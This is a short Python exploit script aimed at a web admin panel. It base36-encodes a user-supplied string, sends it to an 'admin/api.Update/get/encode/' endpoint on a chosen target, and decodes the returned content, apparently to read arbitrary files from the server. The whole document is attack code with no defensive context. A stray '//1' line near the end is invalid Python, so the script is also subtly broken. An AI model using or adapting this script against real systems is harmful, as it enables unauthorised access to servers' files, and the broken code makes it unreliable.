#! /usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import json
import base64
import sys
import argparse



parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', action='store', dest='target', help='target IP address or domain name')
parser.add_argument('-c', '--cmd', action='store', dest='command', help='the command')
args = parser.parse_args()




def base36_encode(number):
    num_str = '0123456789abcdefghijklmnopqrstuvwxyz'
    if number == 0:
        return '0'

    base36 = []
    while number != 0:
        number, i = divmod(number, 36)
        base36.append(num_str[i])

    return ''.join(reversed(base36))




def get_data(url):
        try:
                page = requests.get(url).json()
        except:
                print("Error,please check if the link or network connection is normal.")
                exit(0)
        return base64.b64decode(page['data']['content'].encode()).decode()



content = args.command
tmp_str = ''
for i in range(0,len(content)):
        tmp_str += base36_encode(ord(content[i]))




uri = "public/admin.html?s=admin/api.Update/get/encode/"
target = args.target + uri if args.target[-1] == '/' else args.target + "/" + uri



print("\n" * 8)
//1
print(get_data('http://' + target + tmp_str))
        
